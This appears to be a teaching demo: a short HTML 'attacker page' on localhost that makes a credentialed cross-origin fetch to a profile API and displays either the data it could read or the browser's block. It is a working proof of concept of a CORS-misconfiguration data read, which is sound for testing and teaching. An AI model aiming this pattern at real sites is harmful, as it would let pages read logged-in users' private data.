<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS demo (attacker page)</title>
</head>
<body>
  <h1>Attacker page on http://localhost:9000</h1>
  <p>Log in at http://localhost:8000/login in this browser first, then reload this page.</p>
  <p>Result of the cross origin request:</p>
  <pre id="out">waiting...</pre>
  <script>
    fetch("http://localhost:8000/api/profile", { credentials: "include" })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        document.getElementById("out").textContent =
          "READ SUCCEEDED, attacker can see:\n" + JSON.stringify(data, null, 2);
      })
      .catch(function (err) {
        document.getElementById("out").textContent =
          "BLOCKED by the browser: " + err;
      });
  </script>
</body>
</html>
